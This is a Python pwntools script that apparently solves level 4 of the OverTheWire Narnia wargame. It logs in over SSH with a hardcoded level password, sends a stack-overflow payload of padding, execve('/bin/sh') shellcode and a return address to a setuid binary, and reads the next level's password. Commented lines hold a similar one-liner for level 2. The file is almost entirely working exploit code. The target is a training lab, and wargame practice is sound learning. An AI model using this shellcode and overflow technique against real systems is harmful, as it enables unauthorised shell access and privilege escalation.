from pwn import *
import subprocess

#i like the debug context whenever i use pwntools
context.log_level='debug'
# these are all pretty self explanatory
level=4
user='narnia' + str(level)
host='narnia.labs.overthewire.org'
password='thaenohtai' 
port=2226


def conn():
    #basically just sshs into the level
    return ssh(user=user, host=host, password=password, port=port)
def getPass(shell):
    #this function prints the password
    print('The password for the next level is...')
    shell.sendline('cat /etc/narnia*/narnia' + str(level+1))
    flag=shell.recvuntil('$').split()[0]
def readCode(shell):
    #this function downloads the narnialevel.c file and displays it, and at the end removes the .c
    #file
    code=shell.download_data('/narnia/' + user + '.c')
    shell.download_file('/narnia/' + user + '.c')
    log.info('The code for this level is')
    print(code)
    subprocess.call(['rm',user+'.c'])
#/narnia/./narnia2 $(python -c 'print "A"*104+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"\x90\xd8\xff\xff"')
#context=(arch='i386', os='linux')

#/narnia/./narnia2 $(python -c 'print "A"*104+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"\x90\xd8\xff\xff"')
#\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"\x90\xd8\xff\xff"
#This is the shellcode that works on this level
exe="/narnia/./narnia4 "
#p1="A"*104
NOPsled=r'+"\x90\xd8\xff\xff"'
shellcode=r'"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'
#r is used before the strings to escape the notations

payload=exe
payload+="$(python -c 'print "+'"A"' +"*236"    
payload+="+" + shellcode
payload+=NOPsled +"')" 
#I used the NOPsled method, had to spend half an hour on gdb finding out where to put the return
#address. Basically putting multiple As untill i can edit the return value 

#print (payload) for debugging purposes

sh=conn()
#readCode(sh)
io=sh.shell("bash") 
io.sendline(payload) #the payload is sent

flag=getPass(io) #the password is found

io.interactive() #puts it into interactive mode so you can play around
